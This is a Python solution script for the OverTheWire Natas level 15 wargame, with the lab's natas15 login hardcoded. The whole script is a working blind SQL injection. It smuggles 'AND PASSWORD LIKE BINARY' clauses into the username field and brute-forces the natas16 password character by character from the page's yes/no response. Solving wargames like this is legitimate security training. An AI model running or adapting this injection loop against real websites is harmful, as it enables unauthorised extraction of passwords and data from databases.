import requests
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
available_chars = ""
true_string = "This user exists."
password = ""

#"SELECT * WHERE username = 'natas16'" AND PASSWORD LIKE BINARY "%s%"

#find any values that contain x in any position -> %x%

print("Getting the chars that the password contains!")
for char in chars:
    data_to_give = {"username" : 'natas16" AND PASSWORD LIKE BINARY "%'+char+'%" #'}
    r = requests.post(url, auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=data_to_give)
    if true_string in r.text:
        available_chars = available_chars + char


#using those values build a password
print("\n\nGetting the password now!")

#check if any of the available chars match the current char of the password
#we did range(0,32) because it's the length of the password
for i in range(0,32):
    for char in available_chars:
        data_to_give = {"username" : 'natas16" AND PASSWORD LIKE BINARY "'+password+char+'%" #'}
        r = requests.post(url, auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=data_to_give)
        if true_string in r.text:
            password = password + char
            print(password)



print("\nDone!")
print("The password is " + password)
